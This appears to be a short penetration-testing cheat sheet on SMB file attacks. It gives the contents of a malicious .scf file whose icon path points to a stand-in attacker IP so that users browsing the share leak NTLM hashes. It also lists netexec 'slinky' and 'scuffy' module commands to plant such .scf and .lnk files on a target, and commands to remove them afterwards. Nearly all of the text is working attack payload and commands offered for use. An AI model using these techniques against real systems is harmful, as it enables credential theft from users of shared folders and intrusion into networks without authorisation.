# File Attacks

With write rights on a SMB share, it is possible to drop a .scf or a .lnk file with the following content to grab some user hashes:

    [Shell]
    Command=2
    IconFile=\<attacker_IP>\share\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop

Use netexec to transfer the .lnk or .scf file to target for the attack

    nxc smb <target> -u user1 -p password -M slinky -o SERVER=<attacker_SMB_share_IP> -o NAME=<file_name>
    nxc smb <target> -u user1 -p password -M scuffy -o SERVER=<attacker_SMB_share_IP> -o NAME=<file_name>

##### To clean

    nxc smb <target> -u user1 -p password -M slinky -o CLEANUP=True
    nxc smb <target> -u user1 -p password -M scuffy -o CLEANUP=True
